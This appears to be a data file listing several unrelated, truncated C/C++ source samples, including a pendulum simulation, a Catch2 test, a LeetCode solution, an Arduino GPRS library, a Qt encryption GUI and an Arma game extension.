// optional module docstring\n\n    m.def(\"fmsa\", &findMedianSortedArrays, \"A function median of sorted arrays\",\n\t\t    py::arg(\"nums1\"), py::arg(\"nums2\")\n\t\t    );\n}",
    "/************************/\n/*     main3.cpp        */\n/*    Version 1.0       */\n/*     2023/05/12       */\n/************************/\n\n#include <chrono>\n#include <iostream>\n#include <iomanip>\n#include <string>\n#include <thread>\n#include <vector>\n#include <signal.h>\n#include \"hdf5/hdf5_ext.h\"\n#include \"log/log.h\"\n#include \"pendulum_cart.h\"\n\n#define F_PI static_cast<float>(3.14159265358979323846)\n\nnamespace ge2\n{\n    template <typename T> std::string num_to_string(T num, int decimals = 2)\n    {\n        std::stringstream ss;\n        ss << std::fixed << std::setprecision(decimals) << num;\n        return ss.str();\n    }\n} // namespace ge\n\n// handle SIGNINT\nbool bSignal = false;\nstd::string sSignal;\n\nvoid handle_sigint(int sig)\n{\n    (void)sig;\n    std::cout << \"INPUT H FOR HELP OR SELECT THE ACTION: \";\n    std::getline(std::cin, sSignal);\n    if (sSignal[0] == 'h' || sSignal[0] == 'H')\n    {\n        std::vector<std::string> choices           = {\"Q\", \"V\", \"W\"};\n        std::vector<std::string> choices_desc      = {\"QUIT\", \"VERBOSE\", \"VVERBOSE\"};\n        std::vector<std::string> choices_desc_long = {\"TOGGLE CONTROL RESPONSE\", \"LOAD NN\", \"QUIT THE PROGRAM\",\n                                                      \"TOGGLE VERBOSE\", \"TOGGLE VERY VERBOSE\"};\n        std::cout << \"***************************************\" << std::endl;\n        std::cout << \"CHOOSE ONE OF THE FOLLOWING OPTIONS:\" << std::endl;\n        for (size_t i = 0; i < choices.size(); i++)\n            std::cout << \"* \" << choices[i] << \" - \" << choices_desc[i] << \" - \" << choices_desc_long[i] << std::endl;\n        std::cout << \"***************************************\" << std::endl;\n        return;\n    }\n    bSignal = true;\n}\n\nint main()\n{\n    bool bFileLog = false;\n    LOGGER_PARAM(logging::LEVELMAX, logging::INFO);\n    LOGGER_PARAM(logging::LOGTIME, true);\n    if (bFileLog)\n    {\n        LOGGER_PARAM(logging::FILENAME, \"out_invpendulum.log\");\n        LOGGER_PARAM(logging::FILEOUT, true);\n    }\n#ifndef WIN32\n    signal(SIGINT, handle_sigint);\n#endif\n    ge::InvertedPendulum<float> mInvPendulum;\n    float bestFitness;\n    bool bVerbose = false, bVVerbose = false;\n    const float deltaTime = mInvPendulum.GetDeltaTime();\n    const size_t simSteps = static_cast<size_t>(240.0f / deltaTime);\n    std::vector<float> time(simSteps, 0.0f), vX(simSteps, 0.0f), vXDot(simSteps, 0.0f), vTheta(simSteps, 0.0f),\n        vThetaDot(simSteps, 0.0f);\n    std::vector<std::vector<float>> vKNN(simSteps, std::vector<float>(4, 0.0f));\n#ifdef UP_POSITION\n    const std::string sName = \"up_simul\";\n#else\n    const std::string sName = \"down_simul\";\n#endif\n    h5::H5ppWriter h5(\"./build/archive/\" + sName + \".h5\");\n    (void)bVerbose;\n    (void)bVVerbose;\n    mInvPendulum.onInit();\n    // archive the close-loop simulation\n    mInvPendulum.SetFlag(ge::pflags::CONTROL);\n    mInvPendulum.Reset();\n    for (size_t i = 0; i < simSteps; i++)\n    {\n        mInvPendulum.ComputeMotion();\n        mInvPendulum.IncrementTime();\n        time[i]      = mInvPendulum.GetTime();\n        vX[i]        = mInvPendulum.GetX();\n        vXDot[i]     = mInvPendulum.GetXDot();\n        vTheta[i]    = mInvPendulum.GetTheta();\n        // ensure that theta is in the range [0, 2* pi], adding a small offset to avoid numerical errors\n        vTheta[i]    = vTheta[i] - 2.0f * F_PI * std::floor((std::abs(vTheta[i]) + 0.0001f) / (2.0f * F_PI));\n        vThetaDot[i] = mInvPendulum.GetThetaDot();\n    }\n    h5.write(\"simulation/closeloop/time\", time);\n    h5.write(\"simulation/closeloop/x\", vX);\n    h5.write(\"simulation/closeloop/xdot\", vXDot);\n    h5.write(\"simulation/closeloop/theta\", vTheta);\n    h5.write(\"simulation/closeloop/thetadot\", vThetaDot);\n    h5.write(\"simulation/closeloop/kgain\", mInvPendulum.GetKGain());\n    h5.write(\"simulation/closeloop/k\", mInvPendulum.GetK());\n\n    // archive the NN simulation\n    mInvPendulum.SetFlag(ge::pflags::CONTROL_NN);\n    for (int i = 250; i <= 10000; i += 250)\n    {\n        mInvPendulum.LoadNN(\"../../_var/assets/nn/SIMULATIONS/inverted_pendulum/\" + sName + \"/invpendulum_\" +\n                            std::to_string(i) + \".hd5\");\n        std::cout << \"LOADED FILE: \" << i << std::endl;\n        bestFitness = mInvPendulum.ComputeBestFitness();\n        // compute the motion\n        mInvPendulum.Reset();\n        for (size_t i = 0; i < simSteps; i++)\n        {\n            mInvPendulum.ComputeMotion();\n            mInvPendulum.IncrementTime();\n            time[i]      = mInvPendulum.GetTime();\n            vX[i]        = mInvPendulum.GetX();\n            vXDot[i]     = mInvPendulum.GetXDot();\n            vTheta[i]    = mInvPendulum.GetTheta();\n            // ensure that theta is in the range [0, 2* pi], adding a small offset to avoid numerical errors\n            vTheta[i]    = vTheta[i] - 2.0f * F_PI * std::floor((std::abs(vTheta[i]) + 0.0001f) / (2.0f * F_PI));\n            vThetaDot[i] = mInvPendulum.GetThetaDot();\n            vKNN[i]      = mInvPendulum.GetNnK();\n        }\n\n        h5.wr",
    "#include <catch2/catch.hpp>\n\n#include \"profiling/stats/cldera_register_stats.hpp\"\n#include \"profiling/cldera_bounds_field_test.hpp\"\n#include \"profiling/cldera_field.hpp\"\n#include \"profiling/cldera_profiling_test_manager.hpp\"\n#include \"profiling/cldera_profiling_types.hpp\"\n\n\nTEST_CASE (\"test_manager\") {\n  using namespace cldera;\n  const ekat::Comm comm(MPI_COMM_WORLD);\n\n  register_stats ();\n\n  // 12pm on Dec 8th 2022\n  TimeStamp t(20221208,43200);\n\n  // Initialize test manager\n  ProfilingTestManager test_manager;\n\n  // Initialize simple field\n  constexpr int foo_size = 5;\n  const std::vector<int> foo_sizes(1, foo_size);\n  std::vector<Real> foo_data(foo_size);\n  std::vector<std::string> dimnames = {\"mydim\"};\n  Field foo(\"foo\", foo_sizes, dimnames, foo_data.data());\n\n  // Initialize simple field test\n  const std::string field_test_name = \"Test bounds of foo\";\n  const Real min = 0.0, max = 6.0;\n  const Bounds<Real> bounds{min, max};\n  const auto field_test = std::make_shared<BoundsFieldTest>(field_test_name, foo, bounds, comm);\n\n  // Initialize another simple field test\n  const std::string field_test_name2 = \"Test tighter bounds of foo\";\n  const Bounds<Real> bounds2{2.0, 3.0};\n  const auto field_test2 = std::make_shared<BoundsFieldTest>(field_test_name2, foo, bounds2, comm);\n\n  // Test add field test to test manager\n  REQUIRE_THROWS(test_manager.add_field_test(nullptr)); // Throw on nullptr\n  test_manager.add_field_test(field_test);\n  REQUIRE_THROWS(test_manager.add_field_test(field_test)); // Throw if field_test already exists\n  test_manager.add_field_test(field_test2);\n  \n  // Test has_field_test\n  REQUIRE(test_manager.has_field_test(\"Test does not exist\") == false);\n  REQUIRE(test_manager.has_field_test(field_test_name) == true);\n\n  // Test field test running\n  REQUIRE_THROWS(test_manager.run_field_test(\"Test does not exist\",t));\n  std::iota(foo_data.begin(), foo_data.end(), 1.0); // field within bounds\n  REQUIRE(test_manager.run_field_test(field_test_name,t) == true);\n  REQUIRE(test_manager.run_field_test(field_test_name2,t) == false);\n\n  // Test field test runner\n  std::map<std::string, bool> expected_results = {{field_test_name, true}, {field_test_name2, false}};\n  const auto results = test_manager.run_all_field_tests(t);\n  for (const auto& result : results)\n    REQUIRE(expected_results.at(result.first) == result.second);\n}\n",
    "class Solution {\npublic:\n    int orangesRotting(vector<vector<int>>& grid) {\n     int n=grid.size();\n     int m=grid[0].size();\n     \n     queue<pair<pair<int,int>,int>>q;\n     int vis[n][m];\n\n     for(int i=0; i<n; i++){\n        for(int j=0; j<m; j++){\n            if(grid[i][j]==2){\n                q.push({{i,j},0});\n                vis[i][j]=2;\n            }\n            else{\n                vis[i][j]=0;\n            }\n        }\n     }   \n\n     int time=0;\n     int drow[]={-1,0,1,0};\n     int dcol[]={0,1,0,-1};\n\n     while(!q.empty()){\n        int r=q.front().first.first;\n        int c=q.front().first.second;\n        int t=q.front().second;\n\n        time=max(time,t);\n        q.pop();\n        for(int i=0; i<4; i++){\n            int nrow=r+drow[i];\n            int ncol=c+dcol[i];\n\n            if(nrow>=0 && nrow<n && ncol>=0 && ncol<m && vis[nrow][ncol]!=2 && grid[nrow][ncol]==1){\n                q.push({{nrow,ncol},t+1});\n                vis[nrow][ncol]=2;\n            }\n        }\n     }\n\n     for(int i=0;i<n;i++){\n        for(int j=0;j<m;j++){\n            if(vis[i][j]!=2 && grid[i][j]==1){\n                return -1;\n            }\n        }\n     }\n     return time;\n    }\n};\n",
    "/*\n * GPRS_Shield_Arduino.cpp\n * A library for SeeedStudio seeeduino GPRS shield \n *  \n * Copyright (c) 2015 seeed technology inc.\n * Website    : www.seeed.cc\n * Author     : lawliet zou\n * Create Time: April 2015\n * Change Log :\n *\n * The MIT License (MIT)\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\n\n#include <stdio.h>\n#include \"GPRS_Shield_Arduino.h\"\n\nGPRS* GPRS::inst;\n\nGPRS::GPRS(uint8_t tx, uint8_t rx, uint32_t baudRate):gprsSerial(tx,rx)\n{\n    inst = this;\n    sim900_init(&gprsSerial, baudRate);\n}\n\nbool GPRS::init(void)\n{\n    if(!sim900_check_with_cmd(\"AT\\r\\n\",\"OK\\r\\n\",CMD)){\n\t\treturn false;\n    }\n    \n    if(!sim900_check_with_cmd(\"AT+CFUN=1\\r\\n\",\"OK\\r\\n\",CMD)){\n        return false;\n    }\n    \n    if(!checkSIMStatus()) {\n\t\treturn false;\n    }\n    return true;\n}\n\nbool GPRS::checkPowerUp(void)\n{\n  return sim900_check_with_cmd(\"AT\\r\\n\",\"OK\\r\\n\",CMD);\n}\n\nvoid GPRS::powerUpDown(uint8_t pin)\n{\n  // power on pulse\n  digitalWrite(pin,LOW);\n  delay(1000);\n  digitalWrite(pin,HIGH);\n  delay(2000);\n  digitalWrite(pin,LOW);\n  delay(3000);\n}\n  \nbool GPRS::checkSIMStatus(void)\n{\n    char gprsBuffer[32];\n    int count = 0;\n    sim900_clean_buffer(gprsBuffer,32);\n    while(count < 3) {\n        sim900_send_cmd(\"AT+CPIN?\\r\\n\");\n        sim900_read_buffer(gprsBuffer,32,DEFAULT_TIMEOUT);\n        if((NULL != strstr(gprsBuffer,\"+CPIN: READY\"))) {\n            break;\n        }\n        count++;\n        delay(300);\n    }\n    if(count == 3) {\n        return false;\n    }\n    return true;\n}\n\nbool GPRS::sendSMS(char *number, char *data)\n{\n    //char cmd[32];\n    if(!sim900_check_with_cmd(\"AT+CMGF=1\\r\\n\", \"OK\\r\\n\", CMD)) { // Set message mode to ASCII\n        return false;\n    }\n    delay(500);\n\tsim900_flush_serial();\n\tsim900_send_cmd(\"AT+CMGS=\\\"\");\n\tsim900_send_cmd(number);\n    //sprintf(cmd,\"AT+CMGS=\\\"%s\\\"\\r\\n\", number);\n\t//snprintf(cmd, sizeof(cmd),\"AT+CMGS=\\\"%s\\\"\\r\\n\", number);\n//    if(!sim900_check_with_cmd(cmd,\">\",CMD)) {\n    if(!sim900_check_with_cmd(\"\\\"\\r\\n\",\">\",CMD)) {\n        return false;\n    }\n    delay(1000);\n    sim900_send_cmd(data);\n    delay(500);\n    sim900_send_End_Mark();\n    return sim900_wait_for_resp(\"OK\\r\\n\", CMD);\n}\n\nchar GPRS::isSMSunread()\n{\n    char gprsBuffer[48];  //48 is enough to see +CMGL:\n    char *s;\n    \n\n    //List of all UNREAD SMS and DON'T change the SMS UNREAD STATUS\n    sim900_send_cmd(F(\"AT+CMGL=\\\"REC UNREAD\\\",1\\r\\n\"));\n    /*If you want to change SMS status to READ you will need to send:\n          AT+CMGL=\\\"REC UNREAD\\\"\\r\\n\n      This command will list all UNREAD SMS and change all of them to READ\n      \n     If there is not SMS, response is (30 chars)\n         AT+CMGL=\"REC UNREAD\",1  --> 22 + 2\n                                 --> 2\n         OK                      --> 2 + 2\n\n     If there is SMS, response is like (>64 chars)\n         AT+CMGL=\"REC UNREAD\",1\n         +CMGL: 9,\"REC UNREAD\",\"XXXXXXXXX\",\"\",\"14/10/16,21:40:08+08\"\n         Here SMS text.\n         OK  \n         \n         or\n\n         AT+CMGL=\"REC UNREAD\",1\n         +CMGL: 9,\"REC UNREAD\",\"XXXXXXXXX\",\"\",\"14/10/16,21:40:08+08\"\n         Here SMS text.\n         +CMGL: 10,\"REC UNREAD\",\"YYYYYYYYY\",\"\",\"14/10/16,21:40:08+08\"\n         Here second SMS        \n         OK           \n    */\n\n    sim900_clean_buffer(gprsBuffer,31); \n    sim900_read_buffer(gprsBuffer,30,DEFAULT_TIMEOUT); \n    //Serial.print(\"Buffer isSMSunread: \");Serial.println(gprsBuffer);\n\n    if(NULL != ( s = strstr(gprsBuffer,\"OK\"))) {\n        //In 30 bytes \"doesn't\" fit whole +CMGL: response, if recieve only \"OK\"\n        //    means you don't have any UNREAD SMS\n        delay(50);\n        return 0;\n    } else {\n        //More buffer to read\n        //We are going to flush serial data until OK is recieved\n        sim900_wait_for_resp(\"OK\\r\\n\", CMD);        \n        //sim900_flush_serial();\n        //We have to call command again\n        sim900_send_cmd(\"AT+CMGL=\\\"REC UNREAD\\\",1\\r\\n\");\n        sim900_clean_buffer(gprsBuffer,48); \n        sim900_read_buffe",
    "#include<stdio.h>\r\n#include<malloc.h>\r\n#include<stdlib.h>\r\n#include<string.h>\r\n#include<math.h>\r\nvoid insertatend(char *,int,int,int ,char *,int ,char*,char*,char*);\r\nvoid insertatbg(char *,int,int,int ,char *,int ,char*,char*,char*);\r\nvoid insertatloc(char *,int ,int,int ,char *,int ,char*,char*,char*,int);\r\nvoid displayforward();\r\nvoid displayreverse();\r\nvoid displayforwardc();\r\nvoid displayreversec();\r\nvoid deletionbeg();\r\nvoid deletionend();\r\nvoid deleteFromN(int);\r\nvoid calculation(float ,float ,float );\r\nvoid update_data(int , int );\r\nvoid update_datac(char*,char*);\r\nvoid booking(char*,char *,int,int ,char*,char *,int);\r\nvoid insertbro(char *,char*,int,char*,char*);\r\nvoid clear();\r\nstruct node{\r\n    char name[15];\r\n    int rgno;\r\n    int amount;\r\n    int sqfeet;\r\n    char place[20];\r\n    long int phone;\r\n    char mail[30];\r\n    char address[100];\r\n    int a[200];\r\n    char facility[500];\r\n    //int idno;\r\n    struct node *next;\r\n    struct node *prev;\r\n}*head = NULL, *tail=NULL, *p=NULL, *temp=NULL;\r\nstruct node *deleteByValue(struct node * head, int );\r\nvoid search(struct node* head, char*);\r\nvoid searcham(struct node* head, int);\r\nint main(){\r\n\tchar n[15];\r\n    int r,py;\r\n    int amt,findreg;\r\n    int sq;\r\n    char pl[20],add[50];\r\n    long int ph;\r\n    char m[30],findp[30];\r\n    int choice,chs;\r\n    int mc;\r\n    int i;\r\n    int payment;\r\n    int ch2,l1,findam;\r\n\tint id,old,newa;\r\n\tchar oldp[20],newp[20];\r\n\tchar fac[500];\r\n\tfloat principal, rate, time, emi;\r\n    int pr,index,position;\r\n    int con,chad,conad,dis;\r\n    char chr4,chr3,chr2,chr1;\r\n    int bro;\r\n    char cha[50];\r\n    int ch,b;\r\n    char pass[20];\r\n    printf(\"----------------------------------------------------------------------------------------------------\");\r\n    printf(\"\\n\\t\\t\\t\\tO N L I N E   R E A L   E A S T A T E \");\r\n    printf(\"\\n----------------------------------------------------------------------------------------------------\");\r\n    while(1){\r\n    printf(\"\\nENTER YOUR CHOICE\");\r\n    printf(\"\\nPRESS 1 FOR ADMIN PROFILE\");\r\n    printf(\"\\nPRESS 2 FOR SELLER PROFILE\");\r\n    printf(\"\\nPRESS 3 FOR CLIENT PROFILE\");\r\n    printf(\"\\nPRESS 4 FOR EXIT\\n\");\r\n    scanf(\"%d\",&choice);\r\n    switch(choice){\r\n    case 1:\r\n    \tdo{\r\n    \tprintf(\"\\n***************************************************************************************************\");\r\n    \tprintf(\"\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t-A D M I N  P R O F I L E-\");\r\n    \tprintf(\"\\n\\n***************************************************************************************************\");\r\n    \tprintf(\"\\nPlease enter the password to proceed further:\");\r\n    \tscanf(\"%s\",pass);\r\n    \tif(strcmp(pass,\"realestate\") ==  0){\r\n    \t    printf(\"\\n**PRESS 1**   FOR SELLER PROFILE\");\r\n            printf(\"\\n**PRESS 2**   FOR CLIENT PROFILE\\n\");\r\n            scanf(\"%d\",&chad);\r\n            switch(chad){\r\n        case 1:\r\n    \tprintf(\"\\n***************************************************************************************************\");\r\n    \tprintf(\"\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t-S E L L E R  P R O F I L E-\");\r\n    \tprintf(\"\\n\\n***************************************************************************************************\");\r\n    \tdo{\r\n    \t\tprintf(\"\\n\\t\\t\\t\\t1. To Add the detail\\n\");\r\n            printf(\"\\t\\t\\t\\t2. To view the details\\n\");\r\n            printf(\"\\t\\t\\t\\t3. To Delete the details\\n\");\r\n            printf(\"\\t\\t\\t\\t4. To Modify the details\\n\");\r\n            printf(\"\\t\\t\\t\\t5. To Insert the agent details\\n\");\r\n            printf(\"\\t\\t\\t\\t6. To view the EMI details\\n\");\r\n            printf(\"\\t\\t\\t\\t7. To Clear\\n\");\r\n            scanf(\"%d\",&ch);\r\n        if (ch==1){\r\n        printf(\"\\n<1>.For insertion at begining\\n<2>.Insertion at the end\\n<3>.Insertion at specified location\\n\");\r\n    \tscanf(\"%d\",&pr);\r\n    \tFILE *app;\r\n    \tFILE *faa;\r\n    app=fopen(\"detail.txt\",\"a\");\r\n    faa=fopen(\"facility.txt\",\"a\");\r\n    printf(\" Enter the name  :\");\r\n    scanf(\"%s\",n);\r\n    printf(\" Enter the place :\");\r\n    scanf(\"%s\",pl);\r\n    printf(\" Enter the no.of square feet :\");\r\n    scanf(\"%d\",&sq);\r\n    printf(\" Enter the amount per square feet :\");\r\n    scanf(\"%d\",&amt);\r\n    printf(\" Enter the phone number :\");\r\n    scanf(\"%d\",&ph);\r\n    printf(\" Enter your emaild :\");\r\n    scanf(\"%s\",m);\r\n    printf(\" Enter the address of your place:\");\r\n    scanf(\"%s\",add);;\r\n    printf(\" Enter the facility around the place:\");\r\n    scanf(\"%s\",fac);\r\n    FILE *rollr;\r\n    rollr=fopen(\"ID.txt\",\"r\");\r\n    if (NULL == rollr) {\r\n\t   \tprintf(\"Sorry file can't be opened \\n\");\r\n\t   \tstatic int i=0;\r\n        }\r\n\t    //printf(\"Content of this file are \\n\");\r\n        //while (!feof(rollr)) {\r\n        while (fgets(cha, 50, rollr) != NULL) {\r\n        //printf(\"%s\", str);\r\n              // cha= fgetc(rollr);\r\n               i=atoi(cha);\r\n               //printf(\"%s\", cha);\r\n\t\t\t }\r\n    printf(\"\\n-*-*-*-*-*-*-*-*-*-*-*-*-*---THE PROPERTY ID PROVIDED FOR YOU :%d---*-*-*-*-*-*-*-*-*-*-*-*\",i+1);\r\n    i=i+1;\r\n    r",
    "#include \"ExactCover.h\"\n#include \"ExactCover.h\"\n#include \"ExactCover.h\"\n#include <limits>\n#include <iostream>\n\n#undef VERBOSE_DEBUG\n\ntemplate<typename Container>\nvoid EnsureCapacity(Container& container, std::size_t required = 1)\n{\n    uint64_t oldSize = container.size();\n    uint64_t oldCapacity = container.capacity();\n    uint64_t newCapacity = oldSize + required;\n    if (newCapacity < oldCapacity)\n    {\n        newCapacity = std::min<std::size_t>(newCapacity,\n            (oldCapacity * 3 + 1) / 2);\n        newCapacity = std::max<std::size_t>(newCapacity, 4);\n        container.reserve(newCapacity);\n    }\n}\n\n\nstruct ExactCover::Entry {\n    id_t left, right, up, down;\n    id_t constraint = std::numeric_limits<id_t>::max();\n    id_t move = std::numeric_limits<id_t>::max();\n\n    Entry(id_t id)\n        : left(id), right(id), up(id), down(id)\n    {\n    }\n};\n\n\nstruct ExactCover::Move {\n    std::string name;\n    id_t head = 0;\n\n    Move(std::string name)\n        : name(std::move(name))\n    {\n    }\n};\n\nstruct ExactCover::Constraint {\n    std::string name;\n    id_t head = 0;\n    std::size_t count = 0;\n\n    Constraint(std::string name)\n        : name(std::move(name))\n    {\n    }\n};\n\nExactCover::ExactCover()\n{\n    constraintHead = constraints.size();\n    constraints.emplace_back(\"MandatoryConstraintHead\");\n    auto& chead = constraints[constraintHead];\n    constraints[constraintHead].head = MakeEntry();\n    entries[constraints[constraintHead].head].constraint = constraintHead;\n\n    moveHead = moves.size();\n    moves.emplace_back(\"MoveHead\");\n    moves[moveHead].head = MakeEntry();\n    entries[moves[moveHead].head].move = moveHead;\n}\n\nExactCover::~ExactCover()\n{\n}\n\nExactCover::ExactCover(const ExactCover&) = default;\n\nExactCover& ExactCover::operator=(const ExactCover&) = default;\n\nvoid ExactCover::SolutionSize(std::size_t size)\n{\n    solutionSize = size;\n}\n\nExactCover::id_t ExactCover::MakeEntry()\n{\n    EnsureCapacity(entries);\n    id_t id = entries.size();\n    entries.emplace_back(id);\n    return id;\n}\n\nExactCover::id_t ExactCover::AddConstraint(const std::string& name, bool mandatory)\n{\n    EnsureCapacity(constraints);\n    id_t id = constraints.size();\n    constraints.emplace_back(name);\n    auto entryid = MakeEntry();\n    constraints[id].head = entryid;\n    entries[entryid].constraint = id;\n\n    if (mandatory) {\n        auto& entry = entries[entryid];\n        entry.left = entries[constraints[constraintHead].head].left;\n        entry.right = constraints[constraintHead].head;\n        Link(entryid);\n    }\n    return id;\n}\n\nconst std::string& ExactCover::ConstraintName(id_t id)\n{\n    return constraints[id].name;\n}\n\nExactCover::id_t ExactCover::AddMove(const std::string& name)\n{\n    EnsureCapacity(moves);\n    id_t id = moves.size();\n    moves.emplace_back(name);\n    auto entryid = MakeEntry();\n    moves[id].head = entryid;\n    auto& mhead = entries[moveHead];\n    auto& mentry = entries[entryid];\n    mentry.move = id;\n    mentry.up = mhead.up;\n    mentry.down = moveHead;\n    LinkVert(entryid);\n    return id;\n}\n\nconst std::string& ExactCover::MoveName(id_t id)\n{\n    return moves[id].name;\n}\n\nvoid ExactCover::ConstrainMove(id_t move, id_t constraint)\n{\n    auto id = MakeEntry();\n    auto& entry = entries[id];\n\n    entry.constraint = constraint;\n    entry.move = move;\n    ++constraints[constraint].count;\n\n    auto cheadid = constraints[constraint].head;\n    entry.up = entries[cheadid].up;\n    entry.down = cheadid;\n\n    auto mheadid = moves[move].head;\n    entry.left = entries[mheadid].left;\n    entry.right = mheadid;\n\n    Link(id);\n    LinkVert(id);\n}\n\n\nstd::uint32_t ExactCover::Solve(std::deque<solution_t>& spud)\n{\n    solution_t curSolution;\n    curSolution.reserve(solutionSize);\n    RecursiveSolve(curSolution, spud);\n    return spud.size();\n}\n\n\nvoid\nExactCover::CoverColumn(id_t constraint)\n{\n    auto& col = constraints[constraint];\n    auto& centry = entries[col.head];\n\n    Unlink(col.head);\n\n    for (auto i = centry.down; i != col.head; i = entries[i].down) {\n        auto rheadid = i;\n        auto& rentry = entries[rheadid];\n        for (auto j = rentry.right; j != rheadid; j = entries[j].right) {\n            if (entries[j].constraint != std::numeric_limits<id_t>::max()) {\n                UnlinkVert(j);\n                --constraints[entries[j].constraint].count;\n            }\n        }\n    }\n}\n\n\nvoid\nExactCover::UncoverColumn(id_t constraint)\n{\n    auto& col = constraints[constraint];\n    auto& centry = entries[col.head];\n\n    for (auto i = centry.up; i != col.head; i = entries[i].up) {\n        // auto rheadid = moves[entries[i].move].head;\n        auto rheadid = i;\n        auto& rentry = entries[rheadid];\n        for (auto j = rentry.left; j != rheadid; j = entries[j].left) {\n            if (entries[j].constraint != std::numeric_limits<id_t>::max()) {\n                LinkVert(j);\n                ++constraints[entries[j].constraint].count;\n            }\n        }\n    }\n\n    Link(col.head);\n}\n\n\nvoid\nExactCover::Recursiv",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"bpau_generator\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n\n#include <QDebug>\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n{\n    ui->setupUi(this);\n\n    connect(ui->pushButton_encrypt, &QPushButton::pressed, [this] () {\n        QString filePath = QFileDialog::getOpenFileName(nullptr, \"Open a file \", \"/\", \"All Files (*.*)\");\n\n        if (!QFile::exists(filePath))\n            return;\n\n        QFile input(filePath);\n        input.open(QFile::ReadOnly);\n        QByteArray fileData = input.readAll();\n        input.close();\n\n        QByteArray encryptedData = Encryption::encrypt(fileData, ui->lineEdit->text());\n\n        int reply = QMessageBox::question(nullptr, \"Save as\", \"File is encrypted and ready to be saved\", QMessageBox::Save | QMessageBox::No);\n\n        if (reply == QMessageBox::Save)\n        {\n            QString outputFilePath = QFileDialog::getSaveFileName(nullptr, \"Save encrypted file\", \"/\", \"Tree fish encrypted (*.tfe)\");\n\n            QFile output(outputFilePath);\n            output.open(QFile::WriteOnly);\n            output.write(encryptedData);\n            output.close();\n        }\n    });\n\n    connect(ui->pushButton_decrypt, &QPushButton::pressed, [this]() {\n        QString filePath = QFileDialog::getOpenFileName(nullptr, \"Open a file \", \"\", \"Tree fish encrypted (*.tfe)\");\n\n        if (!QFile::exists(filePath))\n            return;\n\n        QFile input(filePath);\n        input.open(QFile::ReadOnly);\n        QByteArray fileData = input.readAll();\n        input.close();\n\n        QByteArray decryptedData = Encryption::decrypt(fileData, ui->lineEdit->text());\n\n        int reply = QMessageBox::question(nullptr, \"Save as\", \"File is decrypted and ready to be saved\", QMessageBox::Save | QMessageBox::No);\n\n        if (reply == QMessageBox::Save)\n        {\n            QString outputFilePath = QFileDialog::getSaveFileName(nullptr, \"Save encrypted file\", \"\", \"All files (*.*)\");\n\n            QFile output(outputFilePath);\n            output.open(QFile::WriteOnly);\n            output.write(decryptedData);\n            output.close();\n        }\n    });\n}\n\nMainWindow::~MainWindow()\n{\n    delete ui;\n}\n\n",
    "#include \"dllmain.hpp\"\r\n#include <string.h>\r\n#include \"armaFileFunctions.hpp\"\r\n#include \"armaDataFunctions.hpp\"\r\n#include <future>\r\n\r\nnamespace fs = std::filesystem;\r\n\r\nconstexpr auto CURRENT_VERSION = \"1.0.0.0\";\r\nenum returnTypes{\r\n\tERROR = -1,\r\n\tOK\r\n};\r\nint(*callbackPtr)(char const* name, char const* function, char const* data) = nullptr;\r\n\r\nint strncpy_safe(char* output, const String src)\r\n{\r\n\tint i = 0;\r\n\tfor (; src[i] != '\\0'; i++) {\r\n\t\toutput[i] = src[i];\r\n\t}\r\n\toutput[i] = '\\0';\r\n\treturn i;\r\n}\r\n\r\nbool areEqual(const char* _Str1, const char* _Str2) {\r\n\treturn strcmp(_Str1, _Str2) == 0;\r\n}\r\n\r\n//--- Extension version information shown in .rpt file\r\nvoid RVExtensionVersion(char* output, int outputSize) {\r\n\t//--- max outputSize is 32 bytes\r\n\tstrncpy_safe(output, CURRENT_VERSION);\r\n}\r\n\r\nvoid RVExtension(char* output, int outputSize, const char* function) {\r\n\tstrncpy_safe(output, arma::writeFile(function));\r\n}\r\n\r\nvoid RVExtensionRegisterCallback(int(*callbackProc)(char const*, char const*, char const*)) {\r\n\tcallbackPtr = callbackProc;\r\n}\r\n//\"extension\" callExtension[\"function\", [\"arguments\"...]]\r\nint RVExtensionArgs(char* output, int outputSize, const char* function, const char** args, int argsCnt) {\r\n\toutputSize -= 240; //add some 